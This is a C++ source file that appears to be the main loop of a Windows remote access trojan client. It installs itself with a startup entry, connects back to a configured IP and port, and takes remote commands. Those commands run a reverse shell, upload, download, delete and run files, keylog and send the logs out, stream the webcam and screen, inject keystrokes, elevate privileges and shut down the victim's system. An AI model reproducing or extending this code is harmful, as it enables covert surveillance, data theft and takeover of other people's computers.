#include <iostream>
#include <winsock2.h>
#include <chrono>
#include <thread>
#include "video_audio/DeviceEnumerator.h"
#include <string>
#include <shellapi.h>
#include "stream/Stream.h"
#include "download/Download.h"
#include "file/FileManager.h"
#include "information/system/SystemInformation.h"
#include "information/network/NetworkInformation.h"
#include "reverse_shell/ReverseShell.h"
#include "keyboard/KeyboardExecuter.h"
#include "permission/Permission.h"
#include "box_message/MessageBoxGUI.h"
#include "state/SystemState.h"
#include "install/Install.h"
#include "configuration.h"



int main(int argc=0,char*argv[]= nullptr) {
    Sleep(argc);
    HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
    if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
        Install::installClient(INSTALL_PATH,argv[0],SUBDIRECTORY_NAME,SUBDIRECTORY_FILE_NAME,STARTUP_NAME);
        bool connectionState = true;
        while (connectionState) {
            std::cout << "trying to connect " << std::endl;
            WSADATA WSAData;
            WSAStartup(MAKEWORD(2, 0), &WSAData);
            SOCKET sock;
            SOCKADDR_IN sin;
            sin.sin_addr.s_addr = inet_addr(IP);
            sin.sin_family = AF_INET;
            sin.sin_port = htons(PORT);
            sock = socket(AF_INET, SOCK_STREAM, 0);
            bool streamListening = true;
            if (connect(sock, (SOCKADDR *) &sin, sizeof(sin)) != SOCKET_ERROR) {
                std::cout << "Connected to server!" << std::endl;
                Stream stream(sock);
                SystemInformation sysInfo(stream);
                NetworkInformation networkInfo(stream);
                FileManager fileManager(stream);
                ReverseShell reverseShell(stream);
                Download download(stream);
#ifdef KEYLOGGER
                KeyLogger keyLogger(stream);
                keyLogger.tryStart();
#endif
                while (streamListening) {
                    int action = stream.readSize();
                    switch (action) {
                        case -3:{ // Uninstall client
                            Install::uninstall();
                        }
                        case -2: { // Fully disconnect and close program
                            connectionState = false;
                            streamListening = false;
                            break;
                        }
                        case -1: { // Try to connect again to server
                            streamListening = false;
                            break;
                        }
                        case 0: { // System information retrieving
                            sysInfo.send();
                            break;
                        }
                        case 1: {  // Network information retrieving
                            networkInfo.send();
                            break;
                        }
                        case 2: {  // Reading disks of system
                            sysInfo.sendDisks();
                            break;
                        }
                        case 3: { // Read all directory (files and folders)
                            fileManager.send();
                            break;
                        }
                        case 5: { // download file or directory
                            download.start();
                            break;
                        }
                        case 6: { // copy file or directory
                            fileManager.copyFiles();
                            break;
                        }
                        case 7: { // move file or directory
                            fileManager.moveFiles();
                            break;
                        }
                        case 8: { // delete file or directory
                            fileManager.deleteFiles();
                            break;
                        }
                        case 9: { // run file or directory
                            fileManager.runFiles();
                            break;
                        }
                        case 10: { // upload files to directory
                            fileManager.uploadFiles();
                            break;
                        }
                        case 11: { // executes command on shell
                            reverseShell.send();
                            break;
                        }
#ifdef KEYLOGGER
                        case 12: { // tries to start in new thread the keylogger if it's not running
                            keyLogger.tryStart();
                            break;
                        }
                        case 13: { // stops keylogger
                            keyLogger.stopKeylogger();
                            break;
                        }

                        case 4: { // sends last log file in current session of client
                            keyLogger.send();
                            break;
                        }
                        case 14: { // sends all logs located on appdata folder
                            keyLogger.sendAll();
                            break;
                        }
                        case 15: { // sends if the keylogger is currently working
                            keyLogger.sendState();
                            break;
                        }
#endif
                        case 16: {


                            DeviceEnumerator de;
                            std::map<int, Device> devices = de.getVideoDevicesMap();
                            std::vector<std::string> webcamVector;
                            for (auto const &device: devices) {
                                webcamVector.push_back(device.second.deviceName);
                            }
                            stream.sendList(webcamVector);
                            break;
                        }
#ifdef WEBCAM
                            case 17: {

                            std::cout << "START WEBCAM" << std::endl;
                            std::string webcamName = stream.readString();
                            bool fragmented = stream.readSize();
                            int FPS = stream.readSize();
                            DeviceEnumerator de;

                            std::map<int, Device> devices = de.getVideoDevicesMap();
                            for (auto &device: devices) {
                                std::cout << "== AUDIO DEVICE (id:" << device.first << ") ==" << std::endl;
                                std::cout << "Name: " << device.second.deviceName << std::endl;
                                std::cout << "Path: " << device.second.devicePath << std::endl;
                                if (device.second.deviceName == webcamName) {
                                    WebcamManager webcam(stream, device.first, fragmented, FPS,WEBCAM);
                                    webcam.startWebcam();
                                }
                            }

                            break;
                        }
#endif
                        case 18: {
                            std::cout << "keyboard command " << std::endl;
                            std::string keyboardCommand = stream.readString();
                            KeyboardExecuter keyboardExecuter(keyboardCommand);
                            std::thread keyboardThread(&KeyboardExecuter::executeSequence, &keyboardExecuter);
                            keyboardThread.detach();
                            break;
                        }
                        case 19: {
                            std::cout << "has admin permission command " << std::endl;
                            std::cout << Permission::hasAdminPermission() << std::endl;
                            stream.sendSize(Permission::hasAdminPermission());
                            break;
                        }
                        case 20: {
                            std::cout << "elevate permission" << std::endl;
                            BOOL result;
                            result = Permission::elevatePermissions();
                            if (result == 1) {
                                stream.sendSize(1);
                                return 0;
                            }
                            stream.sendSize(result);
                            break;
                        }
                        case 21: {
                            std::cout << "SHOW MESSAGE BOX " << std::endl;
                            std::string boxInformation = stream.readString();
                            MessageBoxGUI messageBox(boxInformation);
                            std::thread messageBoxThread(&MessageBoxGUI::showMessageGUI, &messageBox);
                            messageBoxThread.detach();
                            break;
                        }
#ifdef WEBCAM
                        case 22: {
                            std::cout << "SCREEN STREAM" << std::endl;
                            ScreenStreamer screenStreamer(stream);
                            screenStreamer.sendPicture();
                            break;
                        }
#endif
                        case 23: {
                            std::cout << "LOG OFF" << std::endl;
                            SystemState::setState(0);
                            break;
                        }
                        case 24: {
                            std::cout << "SHUTDOWN " << std::endl;
                            SystemState::setState(1);
                            break;
                        }
                        case 26: {
                            std::cout << "RESTART " << std::endl;
                            SystemState::setState(2);
                            break;
                        }
                        default:
                            break;
                    }
                }
                closesocket(sock);
            }
            WSACleanup();
            std::this_thread::sleep_for(std::chrono::milliseconds(TIMING_RETRY));
        }
    }

    ReleaseMutex(hMutexHandle);
    CloseHandle(hMutexHandle);
    return 0;


}
